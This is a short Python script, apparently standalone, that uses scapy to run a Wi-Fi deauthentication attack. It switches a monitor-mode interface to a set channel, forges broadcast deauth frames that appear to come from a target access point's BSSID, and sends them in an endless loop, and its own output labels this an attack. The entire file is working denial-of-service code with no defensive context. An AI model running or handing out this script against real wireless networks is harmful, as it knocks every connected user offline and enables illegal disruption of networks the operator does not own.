from scapy.all import *
import subprocess
import time


target_bssid = "YY:YY:YY:YY:YY:YY"  
channel = 6                         
iface = "wlan0mon"                   


def set_channel(iface, channel):
    subprocess.call(["iwconfig", iface, "channel", str(channel)])


def create_deauth_packet(bssid):
    return RadioTap() / \
           Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / \
           Dot11Deauth(reason=7) 


set_channel(iface, channel)
deauth_packet = create_deauth_packet(target_bssid)


try:
    print("Starting deauth attack on BSSID:", target_bssid, "on channel:", channel)
    while True:
        sendp(deauth_packet, iface=iface, inter=0.1, count=10, verbose=0)
        time.sleep(0.1)
except KeyboardInterrupt:
    print("Attack stopped by user.")
